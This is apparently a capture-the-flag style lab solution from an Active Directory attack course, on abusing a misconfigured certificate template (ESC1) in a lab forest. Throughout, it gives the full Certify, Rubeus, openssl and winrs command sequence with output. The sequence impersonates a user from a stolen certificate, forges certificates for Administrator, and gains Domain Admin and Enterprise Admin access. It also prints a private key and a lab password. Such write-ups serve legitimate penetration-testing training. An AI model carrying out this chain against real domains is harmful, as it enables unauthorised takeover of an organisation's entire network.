# AD CS (Certificate Services) Attacks

## AD CS (Certificate Services) ESC1 Abuse

### Lab: Hands-On #17

#### Tasks

- Check if AD CS is used by the target forest and find any vulnerable/abusable templates
- Abuse any such template(s) to escalate to Domain Admin and Enterprise Admin

#### Attack Path Diagram

```
[US\pawadmin certificate previously extracted]
      │
(request TGT using certificate)
      │
      ▼
[TGT for US\pawadmin]
      │
(abuse vulnerable AD CS template)
      │
      ▼
[Certificate for US\Administrator]
      │
(request TGT using forged certificate)
      │
      ▼
[TGT for US\Administrator]
      │
(use TGT to access domain controller)
      │
      ▼
[DA access on US-DC.us.techcorp.local]
```

#### Attack Path Steps

1. Enumerate Active Directory Certificate Services (AD CS) and identify vulnerable certificate templates that allow the requester to supply a subject
2. Discover that the `pawadmin` user has enrollment rights over such a template
3. Use a previously extracted certificate for `pawadmin` to request a TGT and impersonate `pawadmin`
4. Abuse the vulnerable certificate template to request a certificate for the Domain Administrator account
5. Use it to request and inject a TGT as `Administrator`, gaining Domain Admin privileges
6. Use the same technique to escalate further and obtain an Enterprise Admin TGT

#### Solution

- Check if AD CS is used by the target forest and find any vulnerable/abusable templates

Using the Certify tool, enumerate the Certification Authorities in the target forest.

```
PS C:\AD\Tools> C:\AD\Tools\Certify.exe cas

[SNIP]

[*] Action: Find certificate authorities

[SNIP]

[*] Root CAs

    Cert SubjectName              : CN=TECHCORP-DC-CA, DC=techcorp, DC=local
    Cert Thumbprint               : EB249CC9D5873C775714D14AE1271B5B4EC75B49
    Cert Serial                   : 4C985A9CB1FB82A346A3BB0BB6D1760B
    Cert Start Date               : 8/4/2024 9:38:37 PM
    Cert End Date                 : 8/5/2029 9:48:36 PM
    Cert Chain                    : CN=TECHCORP-DC-CA,DC=techcorp,DC=local

[SNIP]
```

Enumerate templates.

```
PS C:\AD\Tools> C:\AD\Tools\Certify.exe find

[SNIP]

[*] Action: Find certificate templates

[SNIP]

[*] Available Certificates Templates :

    CA Name                               : Techcorp-DC.techcorp.local\TECHCORP-DC-CA
    Template Name                         : ForAdminsofPrivilegedAccessWorkstations 📜
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificates-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT 📌
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : TECHCORP\Domain Admins        S-1-5-21-2781415573-3701854478-2406986946-512
                                      TECHCORP\Enterprise Admins    S-1-5-21-2781415573-3701854478-2406986946-519
                                      US\pawadmin 👤                S-1-5-21-210670787-2521448726-163245708-1138

[SNIP]
```

`pawadmin` has enrollment rights on a template 'ForAdminsofPrivilegedAccessWorkstations' that has `ENROLLEE_SUPPLIES_SUBJECT` attribute.
This means we can request a certificate for ANY user as `pawadmin`.

We can also enumerate this using the following command.

```
PS C:\AD\Tools> C:\AD\Tools\Certify.exe find /enrolleeSuppliesSubject

[SNIP]

[*] Action: Find certificate templates

    CA Name                               : Techcorp-DC.techcorp.local\TECHCORP-DC-CA
    Template Name                         : ForAdminsofPrivilegedAccessWorkstations 📜
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificates-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT 📌
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : TECHCORP\Domain Admins        S-1-5-21-2781415573-3701854478-2406986946-512
                                      TECHCORP\Enterprise Admins    S-1-5-21-2781415573-3701854478-2406986946-519
                                      US\pawadmin 👤                S-1-5-21-210670787-2521448726-163245708-1138

[SNIP]
```

- Abuse any such template(s) to escalate to Domain Admin and Enterprise Admin

**Get Domain Admin privileges**

Recall that we extracted certificate of `pawadmin` from the `us-jump3` in a previous hands-on (#10).

Use the certificate to request a TGT for `pawadmin` and inject in current session.

```
C:\Windows\system32> echo %Pwn%

asktgt

C:\Windows\system32> C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:pawadmin /certificate:C:\AD\Tools\pawadmin.pfx /password:"P@ssw0rd1!" /nowrap /ptt

[SNIP]

[*] Action: Ask TGT

[SNIP]

[+] Ticket successfully imported!

  ServiceName              :  krbtgt/us.techcorp.local
  ServiceRealm             :  US.TECHCORP.LOCAL
  UserName                 :  pawadmin
  UserRealm                :  US.TECHCORP.LOCAL
  StartTime                :  4/29/2025 8:08:21 AM
  EndTime                  :  4/29/2025 6:08:21 PM
  RenewTill                :  5/6/2025 8:08:21 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  7jDuEshK4Yl01h6BIcaNaw==
  ASREP (key)              :  83B38B91256F03319E963E3823D3C776
```

```
C:\Windows\system32> klist

[SNIP]

Cached Tickets: (1)

#0>     Client: pawadmin @ US.TECHCORP.LOCAL
        Server: krbtgt/us.techcorp.local @ US.TECHCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 4/29/2025 8:08:21 (local)
        End Time:   4/29/2025 18:08:21 (local)
        Renew Time: 5/6/2025 8:08:21 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

Now, from the above session that has the privileges of `pawadmin`, request a certificate for the Domain Administrator `us\Administrator`.

⚠️ Note that Certify will still show the context as `studentuser51` but you can ignore that.

```
C:\Windows\system32> C:\AD\Tools\Certify.exe request /ca:Techcorp-DC.techcorp.local\TECHCORP-DC-CA /template:ForAdminsofPrivilegedAccessWorkstations /altname:Administrator

[SNIP]

[*] Action: Request a Certificates

[SNIP]

[*] Current user context    : US\studentuser51
[*] No subject name specified, using current context as subject.
[*] Template                : ForAdminsofPrivilegedAccessWorkstations
[*] Subject                 : CN=studentuser51, CN=Users, DC=us, DC=techcorp, DC=local
[*] AltName                 : Administrator 🎭

[SNIP]

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA75jYky7x2+EjedaAfGljRAnf0BBr4y9PcyDTJDcHokmJYv6I
eXryzHTOypqD5Tc3847q4zhUHrhKJKZdNnhEezVYJu/0xysfFr/eUV+BvAHCx3yU
7bSA25T411eLeU+vYZXWwsqEc7hM/XjcPBhIfLXtxnO/wcgLxBAYvC+UOACBgqs/
0YfrJkDrKwfnBKMZQ9Ct2bzK0gJT9Uefum90LVRbOmXqrVvMnRcM3d6JdujXexYH
VVCbi4b/JYO0IH8SPz0EmPlz7vV5M0dGgjv6O56zA1F9DjYnOv+EerOLYLCyyltF
EAf6AimfJKtxaiKE2hWzIxMF059Lk253I74TIQIDAQABAoIBACvhv5C9YViXFGtF
KQUgPCkC8fXmfAwA5zk7ws/4MDK96yaxXYd6SCvAHPuobw21Hk9CVqzE7UsvD41E
1v+Z6VjzfTCsdBViRXBiNbKLnnQzklv86j3a+Fq/HxA5nXbbbFCgI9RLSRT0pU0r
LJLpE6WboG/fVTiFjfobxJv6zteujUqveba5zvHecOIER/ThXYXvS32QSjQ6VlzY
Uq1MZaVuwzqv2ozP3hI1+E7uIz1CMb7lEyclVLZJGo5r3HQESkeTJvsT31VziQoh
FOvPj4LRgN0CMP4d/Vo6GTU2L1OoggfCnV4dR0OqJEmdC3oHkoiMEgbP5RQ+4IEb
jVbLfT0CgYEA8bOzbxLH2QpAqkqx8mv7kXp6kWm2Gi8cimRVsZoq47FklssdQEQQ
BmeSgE6+7yJrmFl51IM6r48516DXDm/doVw9ez1nKBljMrpMD7tdVwj1Dluzpitg
+zkwSJBedu1Ja6CjLIzB0yMB2mw7T/X+zPDkHkB45GZ4MGEEmdUNgLsCgYEA/cVE
zQ0TrvvUg9YjMgR7X3Ll2k1v0hbC1unjtu/v30CHhfSVA83ZPtE2F/YFg9z6rS6P
YR544wO/sGlYJfsBwHxWWdr3fSNAMdWQRjh5QjYeFFwitnt0zU5eDvMGmkmPuPal
aOHp9tIobj2aW7LoIyVDBAGtu7tBwBANjCAn29MCgYEAmVkWAua7fOyQUnrJo7D3
DznSAeg77Sjuxq8Z33CcvZGS7Ek56chFEosr29QaN8Zy1VoPfdE0rqYEYNZfG33F
89Z9+27dwAc7dLfWAjUx50J7l/x+YnMrOLjz9VYDWRj7eBmW7XDwmHChgF8i0nyU
iJpdYQQur1qD7s3fCWqvAnkCgYAuYIPfWXl0bC99XIAYHvuRCQV6rNY3tdMrxZjJ
EPZsfXWHBJjLFi6SrVdOb7a4T4U8axrm69O54TCCA+6JGmNKky6Qw1ShePS9ZsM0
IhP/Brbej6wEX3GMJ7tGziExxynN6r11+ntwkR20b+uqwHpuGdwyekAO4/zzJbvk
FOhT4wKBgQCxUuDy/e8Ni7JBLfyZaffPAUmvT2dhA6RF8J6Xg75LDGJ2ODO9c0Sl
nN97shC38CCXiEp+V69pCWp/CvF1M5kI94on0Ez0dYsQrNi0DMH+6L77ubpjWCGT
Kp5ZXRoffx1ihpMc4jx4ji9waPYVVRPlHP4LXpjbM5Qv7l1jU+1biw==
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGSzCCBTOgAwIBAgITdwAAACxdgNvfV3rXbQABAAAALDANBgkqhkiG9w0BAQsF
ADBKMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGDAWBgoJkiaJk/IsZAEZFgh0ZWNo
Y29ycDEXMBUGA1UEAxMOVEVDSENPUlAtREMtQ0EwHhcNMjUwNDI5MTQ1OTE0WhcN
MjYwNDI5MTQ1OTE0WjBtMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGDAWBgoJkiaJ
k/IsZAEZFgh0ZWNoY29ycDESMBAGCgmSJomT8ixkARkWAnVzMQ4wDAYDVQQDEwVV
c2VyczEWMBQGA1UEAxMNc3R1ZGVudHVzZXI1MTCCASIwDQYJKoZIhvcNAQEBBQAD
ggEPADCCAQoCggEBAO+Y2JMu8dvhI3nWgHxpY0QJ39AQa+MvT3Mg0yQ3B6JJiWL+
iHl68sx0zsqag+U3N/OO6uM4VB64SiSmXTZ4RHs1WCbv9McrHxa/3lFfgbwBwsd8
lO20gNuU+NdXi3lPr2GV1sLKhHO4TP143DwYSHy17cZzv8HIC8QQGLwvlDgAgYKr
P9GH6yZA6ysH5wSjGUPQrdm8ytICU/VHn7pvdC1UWzpl6q1bzJ0XDN3eiXbo13sW
B1VQm4uG/yWDtCB/Ej89BJj5c+71eTNHRoI7+jueswNRfQ42Jzr/hHqzi2Cwsspb
RRAH+gIpnySrcWoihNoVsyMTBdOfS5NudyO+EyECAwEAAaOCAwUwggMBMD4GCSsG
AQQBgjcVBwQxMC8GJysGAQQBgjcVCIW5wzuGgYcDg5WPEIKezyOD0cIbgQCE3O12
ho3hJQIBZAIBCzApBgNVHSUEIjAgBggrBgEFBQcDAgYIKwYBBQUHAwQGCisGAQQB
gjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcVCgQoMCYwCgYIKwYBBQUH
AwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkqhkiG9w0BCQ8ENzA1MA4G
CCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYFKw4DAgcwCgYIKoZIhvcN
AwcwHQYDVR0OBBYEFNq9aszNHS/70fNNiCvlp6OdY8htMCgGA1UdEQQhMB+gHQYK
KwYBBAGCNxQCA6APDA1BZG1pbmlzdHJhdG9yMB8GA1UdIwQYMBaAFEdDz9kcRoFq
Y+YzBWhslzcRzVRDMIHWBgNVHR8Egc4wgcswgciggcWggcKGgb9sZGFwOi8vL0NO
PVRFQ0hDT1JQLURDLUNBKDEpLENOPVRlY2hjb3JwLURDLENOPUNEUCxDTj1QdWJs
aWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9u
LERDPXRlY2hjb3JwLERDPWxvY2FsP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/
YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBwwYIKwYBBQUH
AQEEgbYwgbMwgbAGCCsGAQUFBzAChoGjbGRhcDovLy9DTj1URUNIQ09SUC1EQy1D
QSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMs
Q049Q29uZmlndXJhdGlvbixEQz10ZWNoY29ycCxEQz1sb2NhbD9jQUNlcnRpZmlj
YXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkq
hkiG9w0BAQsFAAOCAQEAZiJUQHzTsOGY1wEeWcbKe9tll9/TaVEmQUJHtEJxNttv
8oT0bB4Fg2DBOaWjcHJIi890bBfi87guctLGSopNmVaM+cX0XaJf7WkhT58V5Tpr
3gBrBlip5qmTuvE9qhZ4TTpsL1hsvaEQMrKhYtCIxkLZmgqy/EzneSDqwCU8QQiM
6ka0CBTp0EtAdNtQRP8dxtzkjOKIfmKNDZdwDkZMNlh87uX8UA9hAZY+5lGpDjnX
tR4irsX4nOhDScNrDSG5NAVjjE/5HON6pZIWy1oVTBiq/QjAICNoCk1pemdzprpj
nouQTJBJfeCHD+yQLOuHCKavv9oy7S3GKzmCz41NoA==
-----END CERTIFICATE-----

[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

Copy all the text between "-----BEGIN RSA PRIVATE KEY-----" and "-----END CERTIFICATE-----" and save it to `cert.pem`.

```
C:\Windows\system32> notepad C:/AD/Tools/cert.pem
```

We need to convert it to PFX to use it.
Use openssl binary on the student VM to do that. I will use "P@ssw0rd1!" as the export password.

```
C:\Windows\system32> C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\DA.pfx

Enter Export Password:
Verifying - Enter Export Password:
```

Finally, request a TGT for the DA using the certificate and inject in current session.

```
C:\Windows\system32> echo %Pwn%

asktgt

C:\Windows\system32> C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:Administrator /certificate:C:\AD\Tools\DA.pfx /password:P@ssw0rd1! /nowrap /ptt

[SNIP]

[*] Action: Ask TGT 🎟️

[SNIP]

[+] Ticket successfully imported!

  ServiceName              :  krbtgt/us.techcorp.local
  ServiceRealm             :  US.TECHCORP.LOCAL
  UserName                 :  Administrator 🎭
  UserRealm                :  US.TECHCORP.LOCAL 🏛️
  StartTime                :  4/29/2025 8:16:45 AM
  EndTime                  :  4/29/2025 6:16:45 PM
  RenewTill                :  5/6/2025 8:16:45 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  c4MZyq++l7+wDles9DFMYQ==
  ASREP (key)              :  D5969548E934EDD0CE0271C4188AE9B6
```

```
C:\Windows\system32> klist

[SNIP]

Cached Tickets: (1) 🎟️

#0>     Client: Administrator 🎭 @ US.TECHCORP.LOCAL 🏛️
        Server: krbtgt/us.techcorp.local @ US.TECHCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 4/29/2025 8:16:45 (local)
        End Time:   4/29/2025 18:16:45 (local)
        Renew Time: 5/6/2025 8:16:45 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

Let's try to access the `us-dc` to confirm our privileges.

```
C:\Windows\system32> winrs -r:us-dc "set username && set computername"

USERNAME=Administrator 👤
COMPUTERNAME=US-DC 🖥️
```

**Get Enterprise Admin privileges**

Similarly, we can get Enterprise Admin privileges.

Use the following command to request an EA certificate (same command as use previously).

```
C:\Windows\system32> C:\AD\Tools\Certify.exe request /ca:Techcorp-DC.techcorp.local\TECHCORP-DC-CA /template:ForAdminsofPrivilegedAccessWorkstations /altname:Administrator

[SNIP]
```

Copy all the text between "-----BEGIN RSA PRIVATE KEY-----" and "-----END CERTIFICATE-----" and save it to `cert.pem`.

We need to convert it to PFX to use it. Use openssl binary on the student VM to do that. I will use "P@ssw0rd1!" as the export password.

```
C:\Windows\system32> C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\EA.pfx

Enter Export Password:
Verifying - Enter Export Password:
```

Finally, request and inject the EA TGT in the current session.

📌 Note that here we specify the user to be the Enterprise Admin `techcorp.local\Administrator`.

```
C:\Windows\system32> echo %Pwn%

asktgt

C:\Windows\system32> C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:techcorp.local\Administrator /dc:techcorp-dc.techcorp.local /certificate:C:\AD\Tools\EA.pfx /password:P@ssw0rd1! /nowrap /ptt

[SNIP]

[*] Action: Ask TGT 🎟️

[SNIP]

[+] Ticket successfully imported!

  ServiceName              :  krbtgt/techcorp.local
  ServiceRealm             :  TECHCORP.LOCAL
  UserName                 :  Administrator 🎭
  UserRealm                :  TECHCORP.LOCAL 🏛️
  StartTime                :  4/29/2025 8:20:46 AM
  EndTime                  :  4/29/2025 6:20:46 PM
  RenewTill                :  5/6/2025 8:20:46 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  uwtTsQf3JJJHjTZpdrFrBw==
  ASREP (key)              :  C1FA816D3656C2D3FAE3F48A39886ABB
```

```
C:\Windows\system32> klist

[SNIP]

Cached Tickets: (1) 🎟️

#0>     Client: Administrator 🎭 @ TECHCORP.LOCAL 🏛️
        Server: krbtgt/techcorp.local @ TECHCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 4/29/2025 8:20:46 (local)
        End Time:   4/29/2025 18:20:46 (local)
        Renew Time: 5/6/2025 8:20:46 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

Let's access the forest root DC.

```
C:\Windows\system32> winrs -r:techcorp-dc "set username && set computername"

USERNAME=Administrator 👤
COMPUTERNAME=TECHCORP-DC 🖥️
```

---
---
